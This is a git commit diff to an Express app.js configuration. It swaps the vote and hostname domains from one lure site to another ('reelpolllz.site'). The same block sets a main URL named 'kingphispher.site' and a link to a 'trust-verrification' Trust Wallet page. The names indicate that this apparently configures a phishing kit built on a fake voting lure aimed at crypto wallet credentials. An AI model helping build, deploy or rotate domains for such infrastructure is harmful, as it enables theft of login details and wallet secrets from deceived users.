aaa22012111ef6ed8c7d272a59c5b28be45b8d96
Godwin Idemudia <godwinide@gmail.com>
2024-10-04 20:54:05 +0100

    new

--- app.js
+++ app.js
@@ -46,10 +46,10 @@ app.use(function (req, res, next) {
   res.locals.error = req.flash('error');
   req.app.mainURL = "www.kingphispher.site"
   req.app.mainURL2 = "kingphispher.site"
-  req.app.voteUrl = "www.instatalenthub.site";
-  req.app.voteUrl2 = "instatalenthub.site";
-  req.app.hostname1 = "www.instatalenthub.site";
-  req.app.hostname2 = "instatalenthub.site";
+  req.app.voteUrl = "www.reelpolllz.site";
+  req.app.voteUrl2 = "reelpolllz.site";
+  req.app.hostname1 = "www.reelpolllz.site";
+  req.app.hostname2 = "reelpolllz.site";
 
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
